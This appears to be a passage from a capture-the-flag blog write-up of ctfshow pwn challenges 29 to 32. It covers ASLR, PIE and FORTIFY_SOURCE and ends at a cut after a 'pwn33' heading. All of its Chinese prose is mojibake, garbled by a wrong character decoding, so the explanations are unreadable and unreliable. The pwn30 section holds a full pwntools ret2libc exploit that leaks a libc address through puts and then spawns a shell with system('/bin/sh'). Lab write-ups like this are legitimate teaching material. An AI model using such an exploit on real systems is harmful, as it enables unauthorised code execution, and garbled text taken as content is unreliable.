<p>SLRÔºàAddress Space Layout RandomizationÔºâÊòØ‰∏ÄÁßçËÆ°ÁÆóÊú∫ÂÆâÂÖ®Êú∫Âà∂ÔºåÊó®Âú®Â¢ûÂä†ÊÅ∂ÊÑèÊîªÂáªËÄÖÂú®Á≥ªÁªü‰∏äÊàêÂäüÊâßË°åÊîªÂáªÁöÑÈöæÂ∫¶„ÄÇASLRÈÄöËøáÈöèÊú∫ÂåñËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥Â∏ÉÂ±ÄÊù•Èò≤Ê≠¢ÊîªÂáªËÄÖ‰æùËµñ‰∫éÂ∑≤Áü•ÁöÑÂÜÖÂ≠òÂú∞ÂùÄÔºå‰ªéËÄåÂ¢ûÂä†‰∫ÜÊîªÂáªÁöÑÂ§çÊùÇÊÄß„ÄÇASLRÂèØ‰ª•ÈöèÊú∫Âåñ‰ª•‰∏ãÁªÑ‰ª∂ÁöÑ‰ΩçÁΩÆÔºö</p>
<pre><code>Ê†àÔºöÂåÖÂê´ÂáΩÊï∞Ë∞ÉÁî®ÂíåÂ±ÄÈÉ®ÂèòÈáèÁöÑÂå∫Âüü„ÄÇ
Â†ÜÔºöÁî®‰∫éÂä®ÊÄÅÂàÜÈÖçÂÜÖÂ≠òÁöÑÂå∫Âüü„ÄÇ
ÂÖ±‰∫´Â∫ìÔºöÂä®ÊÄÅÈìæÊé•ÁöÑÂÖ±‰∫´Â∫ìÁöÑÂä†ËΩΩÂú∞ÂùÄ„ÄÇ
‰ª£Á†ÅÊÆµÔºöÂåÖÂê´Á®ãÂ∫èÊåá‰ª§ÁöÑÂå∫Âüü„ÄÇ
</code></pre>
<p>Âú® Linux Á≥ªÁªü‰∏≠Ôºå/proc/sys/kernel/randomize_va_space ÊòØ‰∏Ä‰∏™ÊéßÂà∂ÂíåÊü•ÁúãASLRÁöÑÊé•Âè£Êñá‰ª∂„ÄÇ</p>
<p>/proc/sys/kernel/randomize_va_space ÂèØ‰ª•ÂÖ∑Êúâ‰ª•‰∏ãÂÄºÔºö</p>
<p>0ÔºöË°®Á§∫ ASLR Ë¢´Á¶ÅÁî®„ÄÇÂú®ËøôÁßçÊÉÖÂÜµ‰∏ãÔºåËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥Â∞Ü‰∏ç‰ºöÈöèÊú∫ÂåñÔºåÂêÑ‰∏™ÁªÑ‰ª∂ÁöÑÂú∞ÂùÄ‰ΩçÁΩÆÂ∞ÜÊòØÂõ∫ÂÆöÁöÑ„ÄÇ</p>
<p>1ÔºöË°®Á§∫ ASLR Â∑≤ÂêØÁî®Ôºå‰ΩÜÂè™‰ºöÂØπÂÖ±‰∫´Â∫ìÁöÑÂú∞ÂùÄËøõË°åÈöèÊú∫Âåñ„ÄÇÂç≥Âú®ÊØèÊ¨°ËøêË°åÊó∂ÔºåÂÖ±‰∫´Â∫ìÁöÑÂä†ËΩΩÂú∞ÂùÄ‰ºöÂèëÁîüÂèòÂåñÔºåËÄåËøõÁ®ãÁöÑÊ†à„ÄÅÂ†ÜÂíå‰ª£Á†ÅÊÆµÁöÑÂú∞ÂùÄ‰ΩçÁΩÆ‰ªçÁÑ∂ÊòØÂõ∫ÂÆöÁöÑ„ÄÇ</p>
<p>2ÔºöË°®Á§∫ ASLR Â∑≤ÂêØÁî®ÔºåÂØπËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥‰∏≠ÁöÑÊâÄÊúâÁªÑ‰ª∂ÔºàÂåÖÊã¨Ê†à„ÄÅÂ†Ü„ÄÅÂÖ±‰∫´Â∫ìÂíå‰ª£Á†ÅÊÆµÔºâËøõË°åÂÆåÂÖ®ÈöèÊú∫Âåñ„ÄÇËøôÊòØÊúÄÂÆâÂÖ®ÁöÑËÆæÁΩÆÔºåÂõ†‰∏∫ÊØèÊ¨°ËøêË°åÊó∂ÔºåËøõÁ®ãÁöÑÊâÄÊúâÁªÑ‰ª∂ÁöÑÂú∞ÂùÄ‰ΩçÁΩÆÈÉΩ‰ºöÂèëÁîüÂèòÂåñ„ÄÇ</p>
<h2 id="pwn29">pwn29
</h2><p>PIEÂÖ®Áß∞ÊòØposition-independent executableÔºå‰∏≠ÊñáËß£Èáä‰∏∫Âú∞ÂùÄÊó†ÂÖ≥ÂèØÊâßË°åÊñá‰ª∂ÔºåËØ•ÊäÄÊúØÊòØ‰∏Ä‰∏™ÈíàÂØπ‰ª£Á†ÅÊÆµÔºà.textÔºâ„ÄÅÊï∞ÊçÆÊÆµÔºà.dataÔºâ„ÄÅÊú™ÂàùÂßãÂåñÂÖ®Â±ÄÂèòÈáèÊÆµÔºà.bssÔºâÁ≠âÂõ∫ÂÆöÂú∞ÂùÄÁöÑ‰∏Ä‰∏™Èò≤Êä§ÊäÄÊúØÔºåÂ¶ÇÊûúÁ®ãÂ∫èÂºÄÂêØ‰∫ÜPIE‰øùÊä§ÁöÑËØùÔºåÂú®ÊØèÊ¨°Âä†ËΩΩÁ®ãÂ∫èÊó∂ÈÉΩÂèòÊç¢Âä†ËΩΩÂú∞ÂùÄÔºå‰ªéËÄå‰∏çËÉΩÈÄöËøáROPgadgetÁ≠â‰∏Ä‰∫õÂ∑•ÂÖ∑Êù•Â∏ÆÂä©Ëß£È¢ò„ÄÇÂú®PIEÂíåASLRÂêåÊó∂ÂºÄÂêØÁöÑÊÉÖÂÜµ‰∏ãÔºåÊîªÂáªËÄÖÂ∞ÜÂØπÁ®ãÂ∫èÁöÑÂÜÖÂ≠òÂ∏ÉÂ±Ä‰∏ÄÊó†ÊâÄÁü•ÔºåÂ§ßÂ§ßÂ¢ûÂä†‰∫ÜÂà©Áî®ÈöæÂ∫¶„ÄÇÁÑ∂ËÄåÂú®Â¢ûÂä†ÂÆâÂÖ®ÊÄßÁöÑÂêåÊó∂ÔºåPIE‰πü‰ºö‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÂΩ±ÂìçÊÄßËÉΩÔºåÂõ†Ê≠§Âú®Â§ßÂ§öÊï∞Êìç‰ΩúÁ≥ªÁªü‰∏äPIE‰ªÖÁî®‰∫é‰∏Ä‰∫õÂØπÂÆâÂÖ®ÊÄßË¶ÅÊ±ÇÊØîËæÉÈ´òÁöÑÁ®ãÂ∫è„ÄÇ
<img src="/p/ctfshow-pwn/image-20250301153252889.png"
	width="1764"
	height="390"
	srcset="/p/ctfshow-pwn/image-20250301153252889_hu_a4b57a26fafec2d5.png 480w, /p/ctfshow-pwn/image-20250301153252889_hu_c7cef108288e1c98.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="452"
		data-flex-basis="1085px"
	
></p>
<p><img src="/p/ctfshow-pwn/image-20250301153321757.png"
	width="2160"
	height="890"
	srcset="/p/ctfshow-pwn/image-20250301153321757_hu_eeca942e40f99591.png 480w, /p/ctfshow-pwn/image-20250301153321757_hu_e7215a19cf904032.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="582px"
	
></p>
<p><img src="/p/ctfshow-pwn/image-20250301153350301.png"
	width="740"
	height="293"
	srcset="/p/ctfshow-pwn/image-20250301153350301_hu_98b234fae6be7ca6.png 480w, /p/ctfshow-pwn/image-20250301153350301_hu_7d10b86953a203b3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="606px"
	
></p>
<p>ÂèØ‰ª•ÁúãÂà∞executable:ÂêéÈù¢ËæìÂá∫ÁöÑÊòØmainÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÁî±‰∫éPIE‰øùÊä§ÔºåÂ∑≤ÁªèÂèëÁîü‰∫ÜÂèòÂåñ</p>
<h2 id="pwn30">pwn30
</h2><p><img src="/p/ctfshow-pwn/image-20250301153934320.png"
	width="1206"
	height="274"
	srcset="/p/ctfshow-pwn/image-20250301153934320_hu_990f19d9adc8c603.png 480w, /p/ctfshow-pwn/image-20250301153934320_hu_9ffdc34dd1972c81.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="440"
		data-flex-basis="1056px"
	
></p>
<p>Ê∫¢Âá∫ÊºèÊ¥ûÔºåÁî®ret2libc,Áî®‰∫éÁªïËøáÊ†àÊ∫¢Âá∫ÊºèÊ¥ûÁ≠âÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥ûÁöÑÈò≤Âæ°Êé™ÊñΩÔºàÊØîÂ¶ÇNXÈò≤Âæ°Êú∫Âà∂ÔºâÔºå‰ª•ÂÆûÁé∞‰ª£Á†ÅÊâßË°åÊàñÊèêÂçáÊîªÂáªËÄÖÊùÉÈôê„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÊâìÂç∞Ë∞ÉËØï‰ø°ÊÅØ</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Âª∫Á´ãËøûÊé•</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;28309&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ê∫¢Âá∫ÂÅèÁßªÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># mainÂáΩÊï∞Âú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pltË°®‰∏≠putsÂáΩÊï∞Âú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># gotË°®‰∏≠putsÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># payloadÔºö0x88+0x4‰∏™Êó†Áî®Â°´ÂÖÖÂ≠óÁ¨¶Ë¶ÜÁõñÂà∞ËøîÂõûÂú∞ÂùÄÔºå</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Â∞ÜputsÂáΩÊï∞pltË°®Âú∞ÂùÄÂÅöËøîÂõûÂú∞ÂùÄÔºå‰ª£Ë°®ctfshowÂáΩÊï∞ÊâßË°åÂÆå‰ºöÊâßË°åputsÂáΩÊï∞Ôºå</span>
</span></span><span class="line"><span class="cl"><span class="c1"># main_addrÊòØputsÂáΩÊï∞ÊâßË°åÂÆåÂêéÁöÑËøîÂõûÂú∞ÂùÄÔºå‰ΩøÁî®putsÂáΩÊï∞ÊâßË°åÂÆåÂêéÂõûÂà∞mainÂáΩÊï∞ÁªßÁª≠Âà©Áî®Ê∫¢Âá∫ÊºèÊ¥û</span>
</span></span><span class="line"><span class="cl"><span class="c1"># putsÂáΩÊï∞gotË°®‰∏≠ÁöÑÂú∞ÂùÄ‰Ωú‰∏∫putsÂáΩÊï∞ÊâßË°åÁöÑÂèÇÊï∞ÔºåËÆ©putsÂáΩÊï∞ËæìÂá∫putsÂáΩÊï∞Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÂèëÈÄÅpayload</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Êé•Êî∂putsÂáΩÊï∞ËæìÂá∫ÁöÑputsÂáΩÊï∞Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Ê†πÊçÆÂÜÖÂ≠ò‰∏≠putsÂáΩÊï∞ÁöÑÂú∞ÂùÄÂØªÊâæÁõ∏Â∫îÁöÑlibcÁâàÊú¨‰∏≠putsÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÊâæÂà∞libc‰∏≠ÁöÑputsÂáΩÊï∞Âú∞ÂùÄ‰πãÂêéÔºåÂ∞ÜÂÜÖÂ≠òÁöÑputsÂáΩÊï∞Âú∞ÂùÄÂáèÂéªlibc‰∏≠ÁöÑputsÂáΩÊï∞Âú∞ÂùÄÂ∞±ÂæóÂà∞‰∫ÜlibcÁöÑÂü∫Âú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ‰ΩøÁî®libc.dump(&#34;system&#34;)ÊâæÂà∞libc‰∏≠ÁöÑsystemÂáΩÊï∞Âú∞ÂùÄÔºåÂÜçÂä†‰∏äÂü∫Âú∞ÂùÄÂ∞±ÂæóÂà∞systemÂáΩÊï∞Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ‰ΩøÁî®libc.dump(&#34;str_bin_sh&#34;)ÊâæÂà∞libc‰∏≠ÁöÑ&#34;/bin/sh&#34;Â≠óÁ¨¶‰∏≤Âú∞ÂùÄÔºåÂÜçÂä†‰∏äÂü∫Âú∞ÂùÄÂ∞±ÂæóÂà∞&#34;/bin/sh&#34;Â≠óÁ¨¶‰∏≤Âú®ÂÜÖÂ≠òÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payloadÔºöÂ°´ÂÖÖÊ†àÁ©∫Èó¥Âà∞ËøîÂõûÂú∞ÂùÄÔºåÂ∞ÜËøîÂõûÂú∞ÂùÄË¶ÜÁõñ‰∏∫systemÂáΩÊï∞ÁöÑÂú∞ÂùÄ</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÁÑ∂ÂêéÂ°´ÂÖÖÊâßË°åsystemÂáΩÊï∞‰πãÂêéÁöÑËøîÂõûÂú∞ÂùÄÔºåÂ°´ÂÖÖ‰ªÄ‰πàÈÉΩÂèØ‰ª•Ôºå‰ΩÜÊòØÈïøÂ∫¶ÂøÖÈ°ª‰∏∫4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ÊúÄÂêéÂ°´ÂÖ•systemÁöÑÂèÇÊï∞‚Äú/bin/sh‚Äù</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂìéÔºåÊúâ‰∫õÈöæÁêÜËß£</p>
<h2 id="pwn32">pwn32
</h2><p>FortifyÂäüËÉΩ</p>
<p>Âú®‰ΩøÁî®FORTIFY_SOURCEÂäüËÉΩÁöÑÁºñËØëÂô®ÁéØÂ¢É‰∏≠ÔºåÂΩìÊ£ÄÊµãÂà∞ÊΩúÂú®ÁöÑÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊàñÂÖ∂‰ªñÂÜÖÂ≠òÈîôËØØÊó∂ÔºåÁºñËØëÂô®‰ºöËá™Âä®ÊõøÊç¢ÂØπÂ∫îÁöÑ‰∏çÂÆâÂÖ®CÂ∫ìÂáΩÊï∞Ôºà‰æãÂ¶ÇstrcpyÔºåmemcpyÁ≠âÔºâË∞ÉÁî®‰∏∫Êõ¥ÂÆâÂÖ®ÁöÑÁâàÊú¨„ÄÇËøô‰∫õÂÆâÂÖ®ÁâàÊú¨ÁöÑÂáΩÊï∞Âú®ÊâßË°åÂâç‰ºöËøõË°å‰∏Ä‰∫õËæπÁïåÊ£ÄÊü•Ôºå‰ª•Á°Æ‰øù‰∏ç‰ºöÂèëÁîüÁºìÂÜ≤Âå∫Ê∫¢Âá∫„ÄÇ</p>
<p>Ê≠§Â§ñÔºåFORTIFY_SOURCEËøò‰ºöÂØπÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÂáΩÊï∞ÔºàÂ¶Çprintf„ÄÅscanfÁ≠âÔºâÁöÑÂèÇÊï∞ËøõË°åÊ£ÄÊü•Ôºå‰ª•Á°Æ‰øùÂÖ∂Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÂèÇÊï∞‰∏éÂÆûÈôÖÂèÇÊï∞ÁöÑÁ±ªÂûãÂåπÈÖçÔºå‰ªéËÄåÈÅøÂÖçÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û„ÄÇ</p>
<p>Êú¨Ë¥®‰∏ä‰∏ÄÁßçÊ£ÄÊü•ÂíåÊõøÊç¢Êú∫Âà∂ÔºåÂØπGCCÂíåglibcÁöÑ‰∏Ä‰∏™ÂÆâÂÖ®Ë°•‰∏ÅÔºåÁõÆÂâçÊîØÊåÅmemcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, getsÁ≠â„ÄÇ</p>
<p>¬∑FORTIFY_SOURCE=0: ËøôÊòØFortify SourceÂäüËÉΩÁöÑÈªòËÆ§Á∫ßÂà´Ôºå‰πüÂ∞±ÊòØÁ¶ÅÁî®Áä∂ÊÄÅ„ÄÇ</p>
<p>¬∑FORTIFY_SOURCE=1: ËøôÊòØÁ¨¨‰∏Ä‰∏™ÂêØÁî®Á∫ßÂà´„ÄÇÂ¶ÇÊûúÁºñËØëÂô®Âú®ÁºñËØëÊó∂Ê£ÄÊµãÂà∞ÊΩúÂú®ÁöÑÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊàñÂÖ∂‰ªñÂÜÖÂ≠òÈîôËØØÔºåÂÆÉÂ∞ÜÁîüÊàê‰∏Ä‰∏™ËøêË°åÊó∂Ê£ÄÊü•ÁöÑË≠¶ÂëäÔºå‰ΩÜÁ®ãÂ∫è‰ªçÁÑ∂‰ºöÁªßÁª≠ÊâßË°å„ÄÇ‰æãÂ¶ÇÔºå‰ºöÂ∞ÜstrcpyÊõøÊç¢‰∏∫__strcpy_chkÔºåmemcpyÊõøÊç¢‰∏∫__memcpy_chkÁ≠â„ÄÇ</p>
<p>¬∑FORTIFY_SOURCE=2: ËøôÊòØÊúÄÈ´òÁ∫ßÂà´ÁöÑÂêØÁî®„ÄÇÂ¶ÇÊûúÁºñËØëÂô®Âú®ÁºñËØëÊó∂Ê£ÄÊµãÂà∞ÊΩúÂú®ÁöÑÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊàñÂÜÖÂ≠òÈîôËØØÔºåÂÆÉÂ∞ÜÁîüÊàê‰∏Ä‰∏™ËøêË°åÊó∂Ê£ÄÊü•ÁöÑÈîôËØØÔºåÂπ∂‰∏îÁ®ãÂ∫èÁöÑÊâßË°åÂ∞ÜË¢´ÁªàÊ≠¢</p>
<p><img src="/p/ctfshow-pwn/image-20250301171915204.png"
	width="1919"
	height="888"
	srcset="/p/ctfshow-pwn/image-20250301171915204_hu_b5df67fb215e4d38.png 480w, /p/ctfshow-pwn/image-20250301171915204_hu_32dae61b35072527.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="518px"
	
></p>
<p>fgets(char *str, int n, FILE *stream) ‰ªéÊåáÂÆöÁöÑÊµÅ stream ËØªÂèñ‰∏ÄË°åÔºåÂπ∂ÊääÂÆÉÂ≠òÂÇ®Âú® <strong>str</strong> ÊâÄÊåáÂêëÁöÑÂ≠óÁ¨¶‰∏≤ÂÜÖÔºånÊòØË¶ÅËØªÂèñÁöÑÊúÄÂ§ßÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶</p>
<p>getgid()Áî®Êù•ÂèñÂæóÊâßË°åÁõÆÂâçËøõÁ®ãÁöÑÁªÑËØÜÂà´Á†Å</p>
<p>strtol() ÂáΩÊï∞Â∞ÜÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫ÈïøÊï¥Êï∞ÂÄº</p>
<p>*(_QWORD *)‰Ωú‰∏∫‰∏Ä‰∏™Êï¥‰ΩìÔºåÈÄöÂ∏∏Áî®‰∫éÂ∞Ü‰∏Ä‰∏™Âú∞ÂùÄÔºàÊàñÂÖ∂‰ªñÊï¥Êï∞ÔºâËΩ¨Êç¢‰∏∫‰∏Ä‰∏™ÊåáÂêë64‰ΩçÊó†Á¨¶Âè∑Êï¥Êï∞ÁöÑÊåáÈíàÔºåÂπ∂Ëé∑ÂèñËØ•Âú∞ÂùÄ‰∏äÁöÑÂÄº„ÄÇ</p>
<p>memcpy(void *str1, const void *str2, size_t n) ‰ªéÂ≠òÂÇ®Âå∫ <strong>str2</strong> Â§çÂà∂ <strong>n</strong> ‰∏™Â≠óËäÇÂà∞Â≠òÂÇ®Âå∫ <strong>str1</strong></p>
<h3 id="ÂØπÂáΩÊï∞ÁöÑËß£Èáä">ÂØπÂáΩÊï∞ÁöÑËß£Èáä
</h3><p>mainÂáΩÊï∞‰∏â‰∏™ÂèÇÊï∞ÔºåargcÊòØÂëΩ‰ª§Ë°åÂèÇÊï∞ÁöÑÊï∞ÈáèÔºåargvÊòØÂëΩ‰ª§Ë°åÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑÔºåenvpÊòØÁéØÂ¢ÉÂèòÈáèÊï∞ÁªÑ</p>
<p>setresgid(v3, v3, v3)ÔºöÂ∞ÜÂΩìÂâçËøõÁ®ãÁöÑÁúüÂÆû GID„ÄÅÊúâÊïà GID Âíå‰øùÂ≠òÁöÑ GID ÈÉΩËÆæÁΩÆ‰∏∫v3ÁöÑÂÄº</p>
<ul>
<li><strong><code>v4 = argv[1]</code></strong>ÔºöÂ∞ÜÁ¨¨‰∏Ä‰∏™ÂëΩ‰ª§Ë°åÂèÇÊï∞ËµãÂÄºÁªô <code>v4</code>„ÄÇ</li>
<li><strong><code>\*(_QWORD \*)buf1 = \*(_QWORD \*)v4</code></strong>ÔºöÂ∞Ü <code>v4</code> ÁöÑÂâç 8 ‰∏™Â≠óËäÇÂ§çÂà∂Âà∞ <code>buf1</code> ‰∏≠„ÄÇÔºàQWORDÂÖ´‰∏™Â≠óËäÇÔºâ</li>
<li><strong><code>\*(_WORD \*)&amp;buf1[8] = \*((_WORD \*)v4 + 4)</code></strong>ÔºöÂ∞Ü <code>v4</code> ÁöÑÁ¨¨ 9 ÂíåÁ¨¨ 10 ‰∏™Â≠óËäÇÂ§çÂà∂Âà∞ <code>buf1</code> ÁöÑÁ¨¨ 9 ÂíåÁ¨¨ 10 ‰∏™‰ΩçÁΩÆ„ÄÇÔºàWORD‰∏§‰∏™Â≠óËäÇÔºâ</li>
<li><strong><code>buf1[10] = v4[10]</code></strong>ÔºöÂ∞Ü <code>v4</code> ÁöÑÁ¨¨ 11 ‰∏™Â≠óËäÇÂ§çÂà∂Âà∞ <code>buf1</code> ÁöÑÁ¨¨ 11 ‰∏™‰ΩçÁΩÆ„ÄÇ</li>
<li><strong>‰ΩúÁî®</strong>ÔºöÂ∞Ü <code>argv[1]</code> ÁöÑÂÜÖÂÆπÂ§çÂà∂Âà∞ <code>buf1</code> ‰∏≠„ÄÇ</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250301173019535.png"
	width="2047"
	height="583"
	srcset="/p/ctfshow-pwn/image-20250301173019535_hu_b90c97c1e6f522c2.png 480w, /p/ctfshow-pwn/image-20250301173019535_hu_2c2ce22c23077712.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="351"
		data-flex-basis="842px"
	
></p>
<ol>
<li>Â§ÑÁêÜÂëΩ‰ª§Ë°åÂèÇÊï∞ÔºåÂ∞ÜÂÖ∂Â§çÂà∂Âà∞ÁºìÂÜ≤Âå∫‰∏≠„ÄÇ</li>
<li>ÊâìÂç∞ÁºìÂÜ≤Âå∫ÂÜÖÂÆπ„ÄÇ</li>
<li>‰ªéÊ†áÂáÜËæìÂÖ•ËØªÂèñÊï∞ÊçÆÂπ∂ÊâìÂç∞„ÄÇ</li>
<li>Ê£ÄÊü•ÂëΩ‰ª§Ë°åÂèÇÊï∞Êï∞ÈáèÔºåÂ¶ÇÊûúË∂ÖËøá 4 ‰∏™ÔºåË∞ÉÁî®Êú™ÂÆö‰πâÂáΩÊï∞„ÄÇ</li>
</ol>
<h2 id="pwn33">pwn33
